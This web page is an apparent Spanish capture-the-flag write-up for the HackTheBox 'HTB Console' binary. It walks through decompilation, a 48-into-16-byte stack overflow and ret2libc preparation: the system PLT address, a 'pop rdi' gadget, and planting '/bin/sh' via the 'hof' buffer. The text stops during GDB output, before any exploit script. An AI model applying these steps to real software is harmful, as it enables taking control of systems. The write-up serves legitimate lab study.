@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="content-language" content="en-us" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+
+  
+  
+  <title>HTB Console - HackTheBox &middot; </title>
+  <meta name="title" content="HTB Console - HackTheBox &middot; " />
+  
+
+  
+  
+  <meta name="description" content="64-bit binary. Buffer Overflow. ret2libc." />
+  
+  
+  <link rel="canonical" href="https://your_domain.com/writeups/htb-console-htb/" />
+
+  
+
+
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.e77fb9de95173d1662ee38560277a03d18b19cab04c81086586420c424233164ce4a4a45d7b8080086f14bee2808cdec521b6499d98183e29d7bd90d5c832c88.css" integrity="sha512-53&#43;53pUXPRZi7jhWAnegPRixnKsEyBCGWGQgxCQjMWTOSkpF17gIAIbxS&#43;4oCM3sUhtkmdmBg&#43;Kde9kNXIMsiA==" />
+
+
+  
+
+
+  
+
+
+
+  
+
+
+
+  
+    
+        
+        <script defer type="text/javascript" src="/js/theme.min.b12ffe233a345d2a545ca355b5aa71c906bbebbee2ea801f46de9e7af2b59da08cc4ffe002b2f302ce00f00eddca05abd8f71c16335f949d96e42eb5971c0235.js" integrity="sha512-sS/&#43;Izo0XSpUXKNVtapxyQa7677i6oAfRt6eevK1naCMxP/gArLzAs4A8A7dygWr2PccFjNflJ2W5C61lxwCNQ=="> </script>
+      
+    
+  
+
+  
+    
+        
+        <script defer type="text/javascript" src="/js/codecopy.min.6319d0ad3eae498a0591b4ec1d52cc0156f5c3cb95390089d7d0ac7fe6dfb183161c14f935d25b5ad896840e2a9d6a23f555a7976954d0a263c24a11272aa747.js" integrity="sha512-YxnQrT6uSYoFkbTsHVLMAVb1w8uVOQCJ19Csf&#43;bfsYMWHBT5NdJbWtiWhA4qnWoj9VWnl2lU0KJjwkoRJyqnRw=="> </script>
+      
+    
+  
+
+  
+    
+        
+        <script defer type="text/javascript" src="/js/search.min.bb866b924569dd33a507ff4631eae853f6b6902fe0dbfe5e8aad50e1ccd528db3a01aaf098948dd4516d6bbd2dab8c6716b4b31809eb28ad8ce47d4801a0f0c3.js" integrity="sha512-u4ZrkkVp3TOlB/9GMeroU/a2kC/g2/5eiq1Q4czVKNs6AarwmJSN1FFta70tq4xnFrSzGAnrKK2M5H1IAaDwww=="> </script>
+      
+    
+  
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+
+  <meta property="og:url" content="https://your_domain.com/writeups/htb-console-htb/">
+  <meta property="og:title" content="HTB Console - HackTheBox">
+  <meta property="og:description" content="64-bit binary. Buffer Overflow. ret2libc.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-02-07T19:36:35-03:00">
+    <meta property="article:modified_time" content="2025-02-07T19:36:35-03:00">
+
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB Console - HackTheBox">
+  <meta name="twitter:description" content="64-bit binary. Buffer Overflow. ret2libc.">
+
+  
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script
+      defer
+      type="text/javascript"
+      src="/lib/fuse/fuse.min.1ab2783fdcab6ba75fb69e4ed1e68a14a4b8721d45627d7147f5421d020c24ed4b36a70a8639009001131d8a04f3515f87706308931603f0194983f9db58f114.js"
+      integrity="sha512-GrJ4P9yra6dftp5O0eaKFKS4ch1FYn1xR/VCHQIMJO1LNqcKhjkAkAETHYoE81Ffh3BjCJMWA/AZSYP521jxFA=="
+    ></script>
+  
+
+
+
+  
+  
+  
+
+  
+  
+
+
+
+  
+  
+  
+  
+  
+
+  
+  
+  
+    <link rel="preload" href="https://your_domain.com/fonts/Ubuntu-Regular.woff2" as="font" type="font/woff2" crossorigin>
+  
+
+  
+
+  
+
+</head>
+
+  <body>
+    <script>
+      const siteTheme = "dark";
+      let savedTheme = localStorage.getItem('theme') || siteTheme;
+      if (savedTheme == 'auto') {
+        if ( window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ) {
+          savedTheme = 'dark';
+        }
+      }
+      if (savedTheme === "dark") {
+        document.body.classList.add('dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    </script>
+    <div class="content">
+      <header>
+    
+    <div class="header-cntr">
+    <a class="title" href="/">
+    <span></span>
+    </a>
+  <div class="menu">
+  <nav id="main-menu" class="mm-normal">
+    <ul>
+    <li> <button id="mob-x-icon" class="menu-btn" arial-label="x-icon"> 
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+
+ </button> </li>
+    
+      <li><a href="/writeups/" aria-label="writeups">
+      writeups</li></a>
+    
+    </ul>
+  </nav>
+    <div class="side-menu">
+    
+<button id="search-open" class="menu-btn" aria-label="Search button">
+  
+
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+
+
+</button>
+
+<div id="search-container" data-url="https://your_domain.com/">
+  <div class="search">
+    <div class="panel">
+      <form>
+        
+
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+
+
+        <input type="search" id="search-query" placeholder="Search" tabindex=0 autocomplete="off"/>
+        <button id="search-close" title="Cancel (ESC)">
+          
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+
+
+        </button>
+      </form>
+    </div>
+    <ul id="search-results">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+    </ul>
+  </div>
+</div>
+
+    
+    </div>
+    <button id="mob-hb-icon" class="menu-btn" aria-label="Hamburger icon">
+      
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+
+
+    </button>
+  </div>
+  <script>
+  (function() {
+    document.addEventListener('DOMContentLoaded', function() {
+    const openBtn = document.getElementById('mob-hb-icon');
+    const closeBtn = document.getElementById('mob-x-icon');
+    const mainMenu = document.getElementById('main-menu');
+    const body = document.body;
+
+    openBtn.addEventListener('click', function() {
+        mainMenu.classList.replace('mm-normal', 'mm-mobile-open');
+        closeBtn.style.display = 'block';
+        body.style.overflow = 'hidden';
+    });
+    closeBtn.addEventListener('click', function() {
+        mainMenu.classList.replace('mm-mobile-open', 'mm-normal');
+        closeBtn.style.display = 'none';
+        body.style.overflow = '';
+    });
+    })
+  })();
+  </script>
+  
+  <script>
+  (function() {
+    var mainmenu = document.getElementById('main-menu');
+    if (!mainmenu) return;
+
+    var path = window.location.pathname;
+    var links = mainmenu.querySelectorAll('a');
+
+    links.forEach(function(link) {
+      if (link.getAttribute('href') === path) {
+        link.classList.add('active');
+      }
+    });
+  })();
+  </script>
+  
+</div>
+</header>
+
+      <main>
+        
+
+
+
+
+
+
+
+<h1 class="pg-title">HTB Console - HackTheBox</h1>
+
+
+<div class="meta">
+  
+
+
+
+
+<div class="meta-container">
+  <p>
+    
+    
+      
+      
+      <span class="meta-icon">
+
+    <?xml version="1.0" encoding="utf-8"?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg fill="currentColor" width="800px" height="800px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19,4H17V3a1,1,0,0,0-2,0V4H9V3A1,1,0,0,0,7,3V4H5A3,3,0,0,0,2,7V19a3,3,0,0,0,3,3H19a3,3,0,0,0,3-3V7A3,3,0,0,0,19,4Zm1,15a1,1,0,0,1-1,1H5a1,1,0,0,1-1-1V12H20Zm0-9H4V7A1,1,0,0,1,5,6H7V7A1,1,0,0,0,9,7V6h6V7a1,1,0,0,0,2,0V6h2a1,1,0,0,1,1,1Z"/></svg>
+
+
+</span>
+      Posted on <time datetime="2025-02-07T19:36:35-03:00">Feb 7, 2025</time>
+      
+      
+      
+    
+    
+      <span class="meta-icon">
+
+    <?xml version="1.0" encoding="utf-8"?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg width="800px" height="800px" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+<path d="M23 12C23 18.0751 18.0751 23 12 23C5.92487 23 1 18.0751 1 12C1 5.92487 5.92487 1 12 1C18.0751 1 23 5.92487 23 12ZM3.00683 12C3.00683 16.9668 7.03321 20.9932 12 20.9932C16.9668 20.9932 20.9932 16.9668 20.9932 12C20.9932 7.03321 16.9668 3.00683 12 3.00683C7.03321 3.00683 3.00683 7.03321 3.00683 12Z" fill="currentColor"/>
+<path d="M12 5C11.4477 5 11 5.44771 11 6V12.4667C11 12.4667 11 12.7274 11.1267 12.9235C11.2115 13.0898 11.3437 13.2343 11.5174 13.3346L16.1372 16.0019C16.6155 16.278 17.2271 16.1141 17.5032 15.6358C17.7793 15.1575 17.6155 14.5459 17.1372 14.2698L13 11.8812V6C13 5.44772 12.5523 5 12 5Z" fill="currentColor"/>
+</svg>
+
+
+</span>
+      
+        7 mins
+      
+    
+    
+  </p>
+  
+</div>
+
+  
+
+
+</div>
+
+
+
+
+  <div class="toc">
+    <details >
+      <summary accesskey="c" title="(Alt+C)">
+        Table of Contents
+      </summary>
+      <div class="toc-innr">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#ingenieria-inversa">Ingenieria inversa</a></li>
+    <li><a href="#explotación">Explotación</a></li>
+  </ul>
+</nav>
+      </div>
+    </details>
+  </div>
+  
+
+
+
+<p>Se nos proporciona un binario con las siguientes protecciones.</p>
+<pre><font color="#F66151"><b>$</b></font> checksec htb-console 
+    Arch:       amd64-64-little
+    RELRO:      <font color="#A2734C">Partial RELRO</font>
+    Stack:      <font color="#C01C28">No canary found</font>
+    NX:         <font color="#26A269">NX enabled</font>
+    PIE:        <font color="#C01C28">No PIE (0x400000)</font></pre>
+<p>Vemos que tenemos el NX habilitado, lo que nos impedira ejecutar codigo en la pila.</p>
+
+<h2 id="ingenieria-inversa">
+  Ingenieria inversa
+  
+  <a hidden class="anchor" href="#ingenieria-inversa">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+<p>Abrimos el binario con IDA y decompilamos la funcion <code>MAIN</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">16</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-10h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_401196</span>(a1, a2, a3);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Welcome HTB Console Version 0.1 Beta.&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(s, <span style="color:#ae81ff">16</span>, stdin);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_401201</span>(s);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(s, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(s));
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>El código define un buffer de 16 bytes en la variable <code>s</code> y muestra el mensaje <code>&quot;Welcome HTB Console Version 0.1 Beta.&quot;</code> con <code>PUTS</code>. Luego, entra en un bucle infinito (<code>while (1)</code>) donde solicita una entrada al usuario con <code>printf(&quot;&gt;&gt; &quot;)</code>, la lee con <code>fgets(s, 16, stdin)</code>, y la pasa a la función <code>sub_401201</code>. Finalmente, limpia el buffer con <code>memset</code>. Al decompilar <code>sub_401201</code> vemos lo siguiente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_401201</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">16</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-10h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(a1, <span style="color:#e6db74">&#34;id</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>) )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;guest(1337) guest(1337) HTB(31337)&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(a1, <span style="color:#e6db74">&#34;dir</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>) )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;/home/HTB&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(a1, <span style="color:#e6db74">&#34;flag</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter flag: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(s, <span style="color:#ae81ff">48</span>, stdin);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Whoops, wrong flag!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(a1, <span style="color:#e6db74">&#34;hof</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Register yourself for HTB Hall of Fame!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter your name: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(byte_4040B0, <span style="color:#ae81ff">10</span>, stdin);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;See you on HoF soon! :)&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(a1, <span style="color:#e6db74">&#34;ls</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;- Boxes&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;- Challenges&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;- Endgames&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;- Fortress&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;- Battlegrounds&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(a1, <span style="color:#e6db74">&#34;date</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;date&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Unrecognized command.&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Esta funcion define un buffer de 16 bytes en la variable <code>s</code> y procesa diferentes comandos según la entrada del usuario. Dependiendo del input, el programa responde de manera distinta.</p>
+<ul>
+<li><code>&quot;id&quot;</code> muestra información sobre el usuario.</li>
+<li><code>&quot;dir&quot;</code> imprime el directorio <code>/home/HTB</code>.</li>
+<li><code>&quot;ls&quot;</code> enumera varias categorías de HTB.</li>
+<li><code>&quot;date&quot;</code> ejecuta el comando <code>date</code> con <code>system()</code>.</li>
+<li><code>&quot;hof&quot;</code> solicita un nombre y lo almacena en <code>byte_4040B0</code> con un límite de 10 bytes.</li>
+<li><code>&quot;flag&quot;</code> solicita una entrada con <code>fgets(s, 48, stdin)</code>.</li>
+</ul>
+<p>Si analizamos el comando <code>&quot;flag&quot;</code>, el programa lee hasta 48 bytes en un buffer de 16 bytes, lo que hace al binario vulnerable a <em>Buffer Overflow</em>. Esto permite sobrescribir partes de la memoria y tomar control del flujo de ejecución. Entonces si ejecutamos el binario y enviamos el comando <code>&quot;flag&quot;</code> seguido de una gran cantidad de bytes, provocaremos una violación de segmento (segfault).</p>
+<pre><font color="#F66151"><b>$</b></font> ./htb-console 
+Welcome HTB Console Version 0.1 Beta.
+&gt;&gt; flag
+Enter flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Whoops, wrong flag!
+[1]    93536 segmentation fault (core dumped)  ./htb-console</pre>
+
+<h2 id="explotación">
+  Explotación
+  
+  <a hidden class="anchor" href="#explotaci%c3%b3n">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+<p>Para resolver el desafío, utilizaremos la técnica ret2libc para ejecutar <code>system(&quot;/bin/sh&quot;)</code>. Dado que la función system está enlazada en el binario y PIE no está habilitado (lo que evitaría la aleatorización de direcciones), podemos extraerla directamente desde la PLT usando objdump. La dirección de la función <code>SYSTEM</code> es <code>0x401381</code>.</p>
+<pre><font color="#F66151"><b>$</b></font> objdump -M intel -d htb-console | grep &apos;system&apos;
+0000000000401040 &lt;<font color="#F66151"><b>system</b></font>@plt&gt;:
+  401381:       e8 ba fc ff ff          call   401040 &lt;<font color="#F66151"><b>system</b></font>@plt&gt;</pre>
+<p>También necesitamos encontrar un gadget que nos permita cargar un valor en el registro <code>RDI</code>, ya que según las convenciones de llamada en x86_64, <code>RDI</code> es el primer registro que toma una función como argumento. Para lograr esto, utilizaremos la herramienta <code>ropper</code> para localizar un gadget adecuado que nos permita manipular <code>RDI</code> y pasarle la cadena <code>&quot;/bin/sh&quot;</code> como argumento a la función system.</p>
+<pre><font color="#F66151"><b>$</b></font> ropper --file htb-console --search &apos;pop rdi&apos;
+<font color="#26A269">[INFO]</font> Load gadgets from cache
+<font color="#26A269">[LOAD]</font> loading... <font color="#D0CFCC">100%</font>
+<font color="#26A269">[LOAD]</font> removing double gadgets... <font color="#D0CFCC">100%</font>
+<font color="#26A269">[INFO]</font> <font color="#D0CFCC">Searching for gadgets: pop rdi</font>
+
+<font color="#26A269">[INFO]</font> <font color="#D0CFCC">File: htb-console</font>
+<font color="#C01C28">0x0000000000401473</font>: <font color="#E9AD0C"><b>pop</b></font> <font color="#D0CFCC">rdi</font><font color="#2A7BDE"><b>; </b></font><font color="#E9AD0C"><b>ret</b></font><font color="#2A7BDE"><b>;</b></font></pre>
+<p>Ahora debemos encontrar una manera de pasar la cadena <code>/bin/sh</code> como argumento a <code>system()</code>. Como vimos en la función <code>sub_401201</code>, el comando <code>hof</code> nos permite ingresar un input que se almacena en la dirección de memoria <code>0x4040b0</code>. Esto nos da la posibilidad de escribir <code>/bin/sh</code> en esa ubicación y luego utilizar su dirección como argumento para <code>system</code>. Podemos verificar este comportamiento utilizando GDB.</p>
+<pre><font color="#F66151"><b>gef➤  </b></font>run                                                                                                                                                                                                                                                                                                                    
+Starting program: <font color="#26A269">/home/abund4nt/pwn/htb/htb-console/htb-console</font>                                                                                                                                                                                                                                                             
+[Thread debugging using libthread_db enabled]                                                                                                                                                                                                                                                                                
+Using host libthread_db library &quot;<font color="#26A269">/lib/x86_64-linux-gnu/libthread_db.so.1</font>&quot;.                                                                                                                                                                                                                                                   
+Welcome HTB Console Version 0.1 Beta.                                                                                                                                                                                                                                                                                        
+&gt;&gt; hof                                                                                                                                                                                                                                                                                                                       
+Register yourself for HTB Hall of Fame!                                                                                                                                                                                                                                                                                      
+Enter your name: abund4nt                                                                                                                                                                                                                                                                                                    
+See you on HoF soon! :)                                                                                                                                                                                                                                                                                                      
+&gt;&gt; ^C                                                                                                                                                                                                                                                                                                                        
+Program received signal SIGINT, Interrupt.                                                                                                                                                                                                                                                                                   
+<font color="#12488B">0x00007ffff7d1ba61</font> in <font color="#A2734C">__GI___libc_read</font> (<font color="#2AA1B3">fd</font>=0x0, <font color="#2AA1B3">buf</font>=0x7ffff7e03963 &lt;_IO_2_1_stdin_+131&gt;, <font color="#2AA1B3">nbytes</font>=0x1) at <font color="#26A269">../sysdeps/unix/sysv/linux/read.c</font>:26                                                                                                                                                                                 
+warning: 26     <font color="#26A269">../sysdeps/unix/sysv/linux/read.c</font>: No such file or directory                                                                                                                                                                                                                                                 
+[ Legend: <font color="#F66151"><b>Modified register</b></font> | <font color="#C01C28">Code</font> | <font color="#26A269">Heap</font> | <font color="#A347BA">Stack</font> | <font color="#A2734C">String</font> ]                                                                                                  
